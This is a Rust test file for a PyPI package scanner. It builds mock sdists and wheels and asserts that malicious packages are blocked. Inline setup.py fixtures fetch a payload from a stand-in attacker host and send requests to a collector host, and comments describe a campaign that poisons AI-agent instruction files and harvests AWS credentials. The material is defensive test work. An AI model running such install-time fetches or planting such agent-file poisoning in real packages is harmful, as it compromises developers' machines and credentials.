//! End-to-end tests for `fetch_and_scan_pypi` via MockTransport.

use argus_core::{Decision, ScanReport, Severity};
use argus_pypi::{
    fetch_and_scan_pypi, fetch_and_scan_pypi_with_rules, PreferredFormat, PypiFetchOptions,
    PypiPackageRef,
};
use argus_rules::RuleSession;
use argus_test_support::MockTransport;
use flate2::write::GzEncoder;
use flate2::Compression;
use sha2::{Digest, Sha256};
use std::io::Write;
use std::path::PathBuf;

/// Build a minimal sdist tarball whose single top-level directory is
/// `<name>-<version>/` (PyPI convention). `files` is a list of
/// (relative-path-under-top-dir, body) pairs.
fn make_sdist(name: &str, version: &str, files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut gz = GzEncoder::new(Vec::new(), Compression::default());
    {
        let mut builder = tar::Builder::new(&mut gz);
        let top = format!("{name}-{version}");
        for (rel, body) in files {
            let mut header = tar::Header::new_gnu();
            let full = format!("{top}/{rel}");
            header.set_path(&full).unwrap();
            header.set_size(body.len() as u64);
            header.set_mode(0o644);
            header.set_entry_type(tar::EntryType::Regular);
            header.set_cksum();
            builder.append(&header, *body).unwrap();
        }
        builder.finish().unwrap();
    }
    gz.finish().unwrap()
}

/// Build a minimal wheel (ZIP) with the supplied (path, body) entries.
fn make_wheel(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut buf = Vec::new();
    {
        let mut writer = zip::ZipWriter::new(std::io::Cursor::new(&mut buf));
        let opts: zip::write::FileOptions<()> =
            zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Deflated);
        for (path, body) in files {
            writer.start_file(*path, opts).unwrap();
            writer.write_all(body).unwrap();
        }
        writer.finish().unwrap();
    }
    buf
}

fn sha256_hex(b: &[u8]) -> String {
    hex::encode(Sha256::digest(b))
}

fn packument_for_artifact(
    name: &str,
    version: &str,
    filename: &str,
    url: &str,
    packagetype: &str,
    sha256: &str,
) -> String {
    format!(
        r#"{{
          "info": {{"name": "{name}", "version": "{version}"}},
          "releases": {{
            "{version}": [{{
              "filename": "{filename}",
              "url": "{url}",
              "packagetype": "{packagetype}",
              "digests": {{"sha256": "{sha256}"}}
            }}]
          }}
        }}"#
    )
}

fn fetch_sdist_fixture(files: &[(&str, &[u8])]) -> anyhow::Result<ScanReport> {
    let rules = RuleSession::builtin()?;
    fetch_sdist_fixture_with_rules(files, &rules)
}

fn fetch_sdist_fixture_with_rules(
    files: &[(&str, &[u8])],
    rules: &RuleSession,
) -> anyhow::Result<ScanReport> {
    let registry = "https://mock.registry";
    let name = "syntax-demo";
    let version = "1.0.0";
    let sdist = make_sdist(name, version, files);
    let artifact_url = format!("{registry}/p/{name}-{version}.tar.gz");
    let packument = packument_for_artifact(
        name,
        version,
        &format!("{name}-{version}.tar.gz"),
        &artifact_url,
        "sdist",
        &sha256_hex(&sdist),
    );
    let transport = MockTransport::new();
    transport.insert(
        &format!("{registry}/pypi/{name}/json"),
        packument.into_bytes(),
    );
    transport.insert(&artifact_url, sdist);
    let opts = PypiFetchOptions {
        registry: registry.to_string(),
        prefer: PreferredFormat::Sdist,
        ..PypiFetchOptions::default()
    };
    fetch_and_scan_pypi_with_rules(&PypiPackageRef::parse(name)?, &opts, &transport, rules)
}

fn fetch_error_for_artifact_filename(
    filename: &str,
    cache_dir: Option<PathBuf>,
) -> anyhow::Result<String> {
    let registry = "https://mock.registry";
    let sdist = make_sdist(
        "demo",
        "1.0.0",
        &[(
            "setup.py",
            b"from setuptools import setup\nsetup(name='demo', version='1.0.0')\n",
        )],
    );
    let sdist_url = format!("{registry}/p/demo-1.0.0.tar.gz");
    let packument = packument_for_artifact(
        "demo",
        "1.0.0",
        filename,
        &sdist_url,
        "sdist",
        &sha256_hex(&sdist),
    );

    let transport = MockTransport::new();
    transport.insert(
        &format!("{registry}/pypi/demo/json"),
        packument.into_bytes(),
    );
    transport.insert(&sdist_url, sdist);

    let opts = PypiFetchOptions {
        registry: registry.to_string(),
        cache_dir,
        prefer: PreferredFormat::Sdist,
        ..PypiFetchOptions::default()
    };
    let pkg = PypiPackageRef::parse("demo")?;
    Ok(match fetch_and_scan_pypi(&pkg, &opts, &transport) {
        Ok(report) => {
            anyhow::bail!(
                "expected invalid artifact filename, got successful scan at {}",
                report.path.display()
            );
        }
        Err(err) => format!("{err:#}"),
    })
}

#[test]
fn pypi_registry_metadata_name_mismatch_fails_closed() {
    let registry = "https://mock.registry";
    let artifact_url = format!("{registry}/p/other-package-1.0.0.tar.gz");
    let packument = packument_for_artifact(
        "other-package",
        "1.0.0",
        "other-package-1.0.0.tar.gz",
        &artifact_url,
        "sdist",
        &"a".repeat(64),
    );
    let transport = MockTransport::new();
    transport.insert(
        &format!("{registry}/pypi/demo/json"),
        packument.into_bytes(),
    );
    let opts = PypiFetchOptions {
        registry: registry.to_string(),
        prefer: PreferredFormat::Sdist,
        ..PypiFetchOptions::default()
    };
    let pkg = PypiPackageRef::parse("demo").unwrap();

    let error = fetch_and_scan_pypi(&pkg, &opts, &transport)
        .unwrap_err()
        .to_string();
    assert!(
        error.contains("registry package identity mismatch"),
        "got: {error}"
    );
}

#[test]
fn pypi_report_path_uses_canonical_coordinate_for_name_alias() {
    let registry = "https://mock.registry";
    let sdist = make_sdist(
        "demo-package",
        "1.0.0",
        &[(
            "PKG-INFO",
            b"Metadata-Version: 2.1\nName: demo-package\nVersion: 1.0.0\n",
        )],
    );
    let artifact_url = format!("{registry}/p/demo-package-1.0.0.tar.gz");
    let packument = packument_for_artifact(
        "demo-package",
        "1.0.0",
        "demo-package-1.0.0.tar.gz",
        &artifact_url,
        "sdist",
        &sha256_hex(&sdist),
    );
    let transport = MockTransport::new();
    transport.insert(
        &format!("{registry}/pypi/Demo_Package/json"),
        packument.into_bytes(),
    );
    transport.insert(&artifact_url, sdist);
    let opts = PypiFetchOptions {
        registry: registry.to_string(),
        prefer: PreferredFormat::Sdist,
        ..PypiFetchOptions::default()
    };
    let pkg = PypiPackageRef::parse("Demo_Package").unwrap();

    let report = fetch_and_scan_pypi(&pkg, &opts, &transport).unwrap();
    let coordinate = report.coordinate.as_ref().expect("coordinate is set");

    assert_eq!(report.path.to_string_lossy(), "demo-package@1.0.0");
    assert_eq!(
        report.path.to_string_lossy(),
        format!("{}@{}", coordinate.canonical_name, coordinate.version)
    );
}

#[test]
fn pypi_embedded_identity_mismatch_fails_closed() {
    let registry = "https://mock.registry";
    let sdist = make_sdist(
        "demo",
        "1.0.0",
        &[(
            "PKG-INFO",
            b"Metadata-Version: 2.1\nName: attacker-label\nVersion: 9.9.9\n",
        )],
    );
    let artifact_url = format!("{registry}/p/demo-1.0.0.tar.gz");
    let packument = packument_for_artifact(
        "demo",
        "1.0.0",
        "demo-1.0.0.tar.gz",
        &artifact_url,
        "sdist",
        &sha256_hex(&sdist),
    );
    let transport = MockTransport::new();
    transport.insert(
        &format!("{registry}/pypi/demo/json"),
        packument.into_bytes(),
    );
    transport.insert(&artifact_url, sdist);
    let opts = PypiFetchOptions {
        registry: registry.to_string(),
        prefer: PreferredFormat::Sdist,
        ..PypiFetchOptions::default()
    };
    let pkg = PypiPackageRef::parse("demo").unwrap();

    let error = fetch_and_scan_pypi(&pkg, &opts, &transport)
        .expect_err("embedded identity mismatch must fail closed");
    assert!(format!("{error:#}").contains("artifact identity mismatch"));
}

#[test]
fn pypi_rejects_parent_dir_artifact_filename_before_extracting() -> anyhow::Result<()> {
    let cache_parent = tempfile::tempdir()?;
    let escaped_dir = cache_parent.path().join("escaped-pypi-artifact");

    let err = fetch_error_for_artifact_filename(
        "../escaped-pypi-artifact",
        Some(cache_parent.path().to_path_buf()),
    )?;

    assert!(err.contains("invalid PyPI artifact filename"), "got: {err}");
    assert!(
        !escaped_dir.exists(),
        "registry filename escaped scratch root: {}",
        escaped_dir.display()
    );
    Ok(())
}

#[test]
fn pypi_rejects_absolute_artifact_filename_before_extracting() -> anyhow::Result<()> {
    let outside_parent = tempfile::tempdir()?;
    let absolute_dir = outside_parent.path().join("absolute-pypi-artifact");
    let filename = absolute_dir.to_string_lossy().into_owned();

    let err = fetch_error_for_artifact_filename(&filename, None)?;

    assert!(err.contains("invalid PyPI artifact filename"), "got: {err}");
    assert!(
        !absolute_dir.exists(),
        "registry filename escaped scratch root: {}",
        absolute_dir.display()
    );
    Ok(())
}

#[test]
fn pypi_sdist_setup_subprocess_blocks() {
    let registry = "https://mock.registry";
    let setup_py =
        include_bytes!("../../../corpus/fixtures/pypi-setup-subprocess/setup.py").as_slice();
    let pkg_info =
        include_bytes!("../../../corpus/fixtures/pypi-setup-subprocess/PKG-INFO").as_slice();
    let sdist = make_sdist(
        "pypi-setup-subprocess",
        "1.0.0",
        &[("setup.py", setup_py), ("PKG-INFO", pkg_info)],
    );
    let sdist_url = format!("{registry}/p/pypi-setup-subprocess-1.0.0.tar.gz");
    let packument = format!(
        r#"{{
          "info": {{"name": "pypi-setup-subprocess", "version": "1.0.0"}},
          "releases": {{
            "1.0.0": [{{
              "filename": "pypi-setup-subprocess-1.0.0.tar.gz",
              "url": "{sdist_url}",
              "packagetype": "sdist",
              "digests": {{"sha256": "{}"}}
            }}]
          }}
        }}"#,
        sha256_hex(&sdist),
    );

    let transport = MockTransport::new();
    transport.insert(
        &format!("{registry}/pypi/pypi-setup-subprocess/json"),
        packument.into_bytes(),
    );
    transport.insert(&sdist_url, sdist);

    let opts = PypiFetchOptions {
        registry: registry.to_string(),
        prefer: PreferredFormat::Sdist,
        ..PypiFetchOptions::default()
    };
    let pkg = PypiPackageRef::parse("pypi-setup-subprocess").unwrap();
    let report = fetch_and_scan_pypi(&pkg, &opts, &transport).unwrap();

    let rule_ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(rule_ids.contains(&"setup-subprocess"), "got: {rule_ids:?}");
    assert!(
        rule_ids.contains(&"setup-py-execution"),
        "got: {rule_ids:?}"
    );
    assert_eq!(report.decision, Decision::Block);
    // The report path is the registry coordinate, never the extraction TempDir.
    assert_eq!(
        report.path.to_string_lossy(),
        format!(
            "pypi-setup-subprocess@{}",
            report.package_version.as_deref().expect("version resolved")
        )
    );
}

#[test]
fn pypi_sdist_setup_remote_download_blocks() {
    let registry = "https://mock.registry";
    let setup_py = br#"
import urllib.request
urllib.request.urlopen("https://attacker.example.invalid/payload.py")
"#;
    let sdist = make_sdist("downloader", "1.0.0", &[("setup.py", setup_py)]);
    let sdist_url = format!("{registry}/p/downloader-1.0.0.tar.gz");
    let packument = format!(
        r#"{{
          "info": {{"name": "downloader", "version": "1.0.0"}},
          "releases": {{
            "1.0.0": [{{
              "filename": "downloader-1.0.0.tar.gz",
              "url": "{sdist_url}",
              "packagetype": "sdist",
              "digests": {{"sha256": "{}"}}
            }}]
          }}
        }}"#,
        sha256_hex(&sdist),
    );

    let transport = MockTransport::new();
    transport.insert(
        &format!("{registry}/pypi/downloader/json"),
        packument.into_bytes(),
    );
    transport.insert(&sdist_url, sdist);

    let opts = PypiFetchOptions {
        registry: registry.to_string(),
        prefer: PreferredFormat::Sdist,
        ..PypiFetchOptions::default()
    };
    let pkg = PypiPackageRef::parse("downloader").unwrap();
    let report = fetch_and_scan_pypi(&pkg, &opts, &transport).unwrap();

    let rule_ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(
        rule_ids.contains(&"setup-remote-download"),
        "got: {rule_ids:?}"
    );
    assert_eq!(report.decision, Decision::Block);
}

#[test]
fn pypi_wheel_import_hook_blocks() {
    let registry = "https://mock.registry";
    let init_py = include_bytes!(
        "../../../corpus/fixtures/pypi-wheel-import-hook/pypi_wheel_import_hook/__init__.py"
    )
    .as_slice();
    let metadata = include_bytes!(
        "../../../corpus/fixtures/pypi-wheel-import-hook/pypi_wheel_import_hook-1.0.0.dist-info/METADATA"
    )
    .as_slice();
    let wheel = make_wheel(&[
        ("pypi_wheel_import_hook/__init__.py", init_py),
        ("pypi_wheel_import_hook-1.0.0.dist-info/METADATA", metadata),
    ]);
    let wheel_url = format!("{registry}/p/pypi_wheel_import_hook-1.0.0-py3-none-any.whl");
    let packument = format!(
        r#"{{
          "info": {{"name": "pypi-wheel-import-hook", "version": "1.0.0"}},
          "releases": {{
            "1.0.0": [{{
              "filename": "pypi_wheel_import_hook-1.0.0-py3-none-any.whl",
              "url": "{wheel_url}",
              "packagetype": "bdist_wheel",
              "digests": {{"sha256": "{}"}}
            }}]
          }}
        }}"#,
        sha256_hex(&wheel),
    );

    let transport = MockTransport::new();
    transport.insert(
        &format!("{registry}/pypi/pypi-wheel-import-hook/json"),
        packument.into_bytes(),
    );
    transport.insert(&wheel_url, wheel);

    let opts = PypiFetchOptions {
        registry: registry.to_string(),
        prefer: PreferredFormat::Wheel,
        ..PypiFetchOptions::default()
    };
    let pkg = PypiPackageRef::parse("pypi-wheel-import-hook").unwrap();
    let report = fetch_and_scan_pypi(&pkg, &opts, &transport).unwrap();

    let rule_ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(rule_ids.contains(&"import-time-hook"), "got: {rule_ids:?}");
    assert_eq!(report.decision, Decision::Block);
}

#[test]
fn pypi_typosquat_rrequests_blocks() {
    // Clean setup.py, no payload — but the name `rrequests` is one edit
    // away from the legitimate `requests` package. The typosquat rule
    // alone should block.
    let registry = "https://mock.registry";
    let setup_py =
        include_bytes!("../../../corpus/fixtures/pypi-typosquat-rrequests/setup.py").as_slice();
    let pkg_info =
        include_bytes!("../../../corpus/fixtures/pypi-typosquat-rrequests/PKG-INFO").as_slice();
    let sdist = make_sdist(
        "rrequests",
        "1.0.0",
        &[("setup.py", setup_py), ("PKG-INFO", pkg_info)],
    );
    let sdist_url = format!("{registry}/p/rrequests-1.0.0.tar.gz");
    let packument = format!(
        r#"{{
          "info": {{"name": "rrequests", "version": "1.0.0"}},
          "releases": {{
            "1.0.0": [{{
              "filename": "rrequests-1.0.0.tar.gz",
              "url": "{sdist_url}",
              "packagetype": "sdist",
              "digests": {{"sha256": "{}"}}
            }}]
          }}
        }}"#,
        sha256_hex(&sdist),
    );

    let transport = MockTransport::new();
    transport.insert(
        &format!("{registry}/pypi/rrequests/json"),
        packument.into_bytes(),
    );
    transport.insert(&sdist_url, sdist);

    let opts = PypiFetchOptions {
        registry: registry.to_string(),
        prefer: PreferredFormat::Sdist,
        ..PypiFetchOptions::default()
    };
    let pkg = PypiPackageRef::parse("rrequests").unwrap();
    let report = fetch_and_scan_pypi(&pkg, &opts, &transport).unwrap();

    let rule_ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(rule_ids.contains(&"typosquatting"), "got: {rule_ids:?}");
    assert!(rule_ids.contains(&"low-reputation"), "got: {rule_ids:?}");
    assert_eq!(report.decision, Decision::Block);
}

#[test]
fn pypi_trapdoor_style_full_chain() {
    // Models the PyPI half of the TrapDoor campaign (Socket.dev
    // 2026-05-24): sdist whose setup.py writes attacker prompts to
    // ~/.cursorrules and CLAUDE.md while harvesting AWS credentials and
    // exfiltrating to attacker-controlled GitHub Pages.
    let registry = "https://mock.registry";
    let setup_py = include_bytes!("../../../corpus/fixtures/pypi-trapdoor/setup.py").as_slice();
    let pkg_info = include_bytes!("../../../corpus/fixtures/pypi-trapdoor/PKG-INFO").as_slice();
    let sdist = make_sdist(
        "defi-threat-scanner",
        "0.1.0",
        &[("setup.py", setup_py), ("PKG-INFO", pkg_info)],
    );
    let sdist_url = format!("{registry}/p/defi-threat-scanner-0.1.0.tar.gz");
    let packument = format!(
        r#"{{
          "info": {{"name": "defi-threat-scanner", "version": "0.1.0"}},
          "releases": {{
            "0.1.0": [{{
              "filename": "defi-threat-scanner-0.1.0.tar.gz",
              "url": "{sdist_url}",
              "packagetype": "sdist",
              "digests": {{"sha256": "{}"}}
            }}]
          }}
        }}"#,
        sha256_hex(&sdist),
    );

    let transport = MockTransport::new();
    transport.insert(
        &format!("{registry}/pypi/defi-threat-scanner/json"),
        packument.into_bytes(),
    );
    transport.insert(&sdist_url, sdist);

    let opts = PypiFetchOptions {
        registry: registry.to_string(),
        prefer: PreferredFormat::Sdist,
        ..PypiFetchOptions::default()
    };
    let pkg = PypiPackageRef::parse("defi-threat-scanner").unwrap();
    let report = fetch_and_scan_pypi(&pkg, &opts, &transport).unwrap();

    let rule_ids: std::collections::BTreeSet<&str> =
        report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    // Setup-time signals
    assert!(rule_ids.contains("setup-py-execution"), "got: {rule_ids:?}");
    assert!(
        rule_ids.contains("setup-remote-download"),
        "got: {rule_ids:?}"
    );
    // AI-agent context poisoning (the novel TrapDoor primitive)
    assert!(
        rule_ids.contains("ai-context-poisoning"),
        "got: {rule_ids:?}"
    );
    // Credential file paths
    assert!(rule_ids.contains("credential-access"), "got: {rule_ids:?}");
    // Note: `setup-remote-download` above is the PyPI-side equivalent of
    // `network-exfiltration`. The generic JS rule stays JS-only — Python
    // docstring examples like `requests.get('https://...')` produce
    // unmanageable false positives. See `external_fetch` in
    // argus-rules/content.rs.
    assert_eq!(report.decision, Decision::Block);
}

#[test]
fn pypi_rejects_sha256_mismatch() {
    let registry = "https://mock.registry";
    let sdist = make_sdist(
        "demo",
        "1.0.0",
        &[(
            "setup.py",
            b"from setuptools import setup\nsetup(name='demo', version='1.0.0')\n",
        )],
    );
    let sdist_url = format!("{registry}/p/demo-1.0.0.tar.gz");
    // Bogus digest — argus must refuse to scan.
    let fake_digest = "0".repeat(64);
    let packument = format!(
        r#"{{
          "info": {{"name": "demo", "version": "1.0.0"}},
          "releases": {{
            "1.0.0": [{{
              "filename": "demo-1.0.0.tar.gz",
              "url": "{sdist_url}",
              "packagetype": "sdist",
              "digests": {{"sha256": "{fake_digest}"}}
            }}]
          }}
        }}"#
    );

    let transport = MockTransport::new();
    transport.insert(
        &format!("{registry}/pypi/demo/json"),
        packument.into_bytes(),
    );
    transport.insert(&sdist_url, sdist);

    let opts = PypiFetchOptions {
        registry: registry.to_string(),
        prefer: PreferredFormat::Sdist,
        ..PypiFetchOptions::default()
    };
    let pkg = PypiPackageRef::parse("demo").unwrap();
    // anyhow's `to_string()` only shows the topmost context wrapper, which
    // says "verify SHA-256 of ...". Use the full chain via `{:#}` so we
    // can assert on the root cause too.
    let err = format!(
        "{:#}",
        fetch_and_scan_pypi(&pkg, &opts, &transport).unwrap_err()
    );
    assert!(err.contains("SHA-256 mismatch"), "got: {err}");
}

#[test]
fn pypi_setup_ast_resolves_aliases_constants_and_deduplicates() -> anyhow::Result<()> {
    let report = fetch_sdist_fixture(&[(
        "setup.py",
        br#"
import requests as request_client
from subprocess import run as execute
from builtins import eval as evaluate
BASE = "https://collector.example.invalid"
send = request_client.get
send(BASE + "/first")
send(BASE + "/second")
execute(["true"])
evaluate("1 + 1")
"#,
    )])?;
    for rule_id in [
        "setup-remote-download",
        "setup-subprocess",
        "setup-eval",
        "setup-py-execution",
    ] {
        assert_eq!(
            report
                .findings
                .iter()
                .filter(|finding| finding.rule_id == rule_id)
                .count(),
            1,
            "{rule_id}: {:?}",
            report.findings
        );
    }
    assert_eq!(report.decision, Decision::Block);
    Ok(())
}

#[test]
fn pypi_setup_ast_ignores_docstrings_comments_and_strings() -> anyhow::Result<()> {
    let report = fetch_sdist_fixture(&[(
        "setup.py",
        br#"
"""Examples:
subprocess.run(["curl", "https://collector.example.invalid"])
requests.get("https://collector.example.invalid")
eval(payload)
"""
# os.system("curl https://collector.example.invalid")
docs = "urllib.request.urlopen('https://collector.example.invalid')"
exec()
eval()
from setuptools import setup
setup(name="syntax-demo", version="1.0.0")
"#,
    )])?;
    assert!(
        report.findings.iter().all(|finding| !matches!(
            finding.rule_id.as_str(),
            "setup-subprocess" | "setup-remote-download" | "setup-eval" | "setup-py-execution"
        )),
        "got: {:?}",
        report.findings
    );
    assert_eq!(report.decision, Decision::Allow);
    Ok(())
}

#[test]
fn pypi_malformed_setup_source_fails_closed() {
    let error = fetch_sdist_fixture(&[("setup.py", b"if True print('broken')")]).unwrap_err();
    assert!(
        format!("{error:#}").contains("refusing incomplete analysis"),
        "got: {error:#}"
    );
}

#[test]
fn pypi_ordinary_module_network_call_is_not_setup_execution() -> anyhow::Result<()> {
    let report = fetch_sdist_fixture(&[
        (
            "pyproject.toml",
            b"[project]\nname='syntax-demo'\nversion='1.0.0'\n",
        ),
        (
            "syntax_demo/client.py",
            b"import requests\nrequests.get('https://collector.example.invalid')\n",
        ),
    ])?;
    assert!(
        report.findings.iter().all(|finding| !matches!(
            finding.rule_id.as_str(),
            "setup-remote-download" | "setup-py-execution"
        )),
        "got: {:?}",
        report.findings
    );
    Ok(())
}

const EXTERNAL_RULE_ID: &str = "pypi-external-marker";

fn external_rule_session(off: bool) -> RuleSession {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("rules.yaml"),
        format!(
            "schema_version: 1\nrules:\n  - {{ id: \"{EXTERNAL_RULE_ID}\", description: \"external test rule\", policy_class: blocking, default_severity: high, help_uri: \"https://example.test/external-rule\", languages: [text], matcher: {{ kind: literal, pattern: \"ARGUS_EXTERNAL_RULE_MARKER\" }} }}\n"
        ),
    )
    .unwrap();
    let overrides = off
        .then(|| format!("{EXTERNAL_RULE_ID}=off"))
        .into_iter()
        .collect::<Vec<_>>();
    RuleSession::load(Some(dir.path()), &overrides).unwrap()
}

#[test]
fn pypi_external_rule_matches_and_can_be_disabled() {
    let files: &[(&str, &[u8])] = &[
        (
            "setup.py",
            b"from setuptools import setup\nsetup(name='syntax-demo')\n",
        ),
        ("marker.txt", b"ARGUS_EXTERNAL_RULE_MARKER"),
    ];
    let enabled = external_rule_session(false);
    let report = fetch_sdist_fixture_with_rules(files, &enabled).unwrap();
    let finding = report
        .findings
        .iter()
        .find(|f| f.rule_id == EXTERNAL_RULE_ID)
        .unwrap();
    let location = "syntax-demo-1.0.0/marker.txt";
    assert_eq!(
        (finding.severity, finding.location.as_deref()),
        (Severity::High, Some(location))
    );
    assert_eq!(finding.evidence, Some(vec![format!("{location}:1")]));
    assert_eq!(report.decision, Decision::Block);
    assert_eq!(report.rules.as_ref(), enabled.metadata());
    let metadata = report.rules.as_ref().unwrap();
    assert_eq!(metadata.loaded_external_files, vec!["rules.yaml"]);
    assert_eq!(metadata.external_rule_count, 1);
    assert_eq!(metadata.disabled_rule_ids, Vec::<String>::new());
    assert_eq!(metadata.applied_overrides, Vec::<String>::new());
    assert_eq!(metadata.external_rules.len(), 1);
    let external_rule = &metadata.external_rules[0];
    assert_eq!(
        (
            external_rule.id.as_str(),
            external_rule.description.as_str(),
            external_rule.help_uri.as_str(),
            external_rule.severity,
        ),
        (
            EXTERNAL_RULE_ID,
            "external test rule",
            "https://example.test/external-rule",
            Severity::High,
        )
    );

    let disabled = external_rule_session(true);
    let report = fetch_sdist_fixture_with_rules(files, &disabled).unwrap();
    assert!(!report
        .findings
        .iter()
        .any(|f| f.rule_id == EXTERNAL_RULE_ID));
    assert_eq!(report.decision, Decision::Allow);
    assert_eq!(report.rules.as_ref(), disabled.metadata());
    let metadata = report.rules.unwrap();
    assert_eq!(metadata.disabled_rule_ids, vec![EXTERNAL_RULE_ID]);
    assert_eq!(
        metadata.applied_overrides,
        vec![format!("{EXTERNAL_RULE_ID}=off")]
    );
}
